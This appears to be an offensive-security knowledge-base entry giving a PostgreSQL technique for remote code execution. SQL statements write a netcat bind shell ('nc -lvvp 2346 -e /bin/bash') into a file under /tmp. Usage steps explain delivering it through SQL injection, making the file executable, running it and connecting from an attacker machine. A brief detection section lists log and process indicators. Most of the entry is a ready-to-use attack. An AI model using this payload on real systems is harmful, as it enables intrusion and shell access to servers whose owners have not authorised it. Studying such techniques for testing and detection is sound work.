---
id: 082704b3-d95a-4da0-b727-05c005c68645
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.992928+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - postgresql
  - payload
  - file-write
  - bind-shell
validated: true
---

# PostgreSQL-Table-Method-for-Bind-Shell-File-Write

## Code

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

## Description

This SQL code sequence creates a table, inserts a netcat bind shell payload, verifies it with SELECT, and copies it to a file on the server. It enables writing executable commands via database access for RCE.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 2346 | Bind port for netcat listener | 4444 |
| /tmp/pentestlab | Output file path | /tmp/shell.sh |

## Usage

Execute via SQL injection or psql to write the bind shell script. Then, chmod +x the file and run it on the server to start listening. Connect with nc target_ip 2346 from attacker machine. Used in web app exploits where DB has file write perms.

## Detection

- PostgreSQL logs showing CREATE TABLE, INSERT, COPY with suspicious paths.
- File creation in /tmp with netcat commands.
- Network connections on non-standard ports from postgres process.
- Process monitoring for nc spawned by postgres user.

## Related

- [[procedures/PostgreSQL-File-Write-with-Reverse-Shell-Payload]]
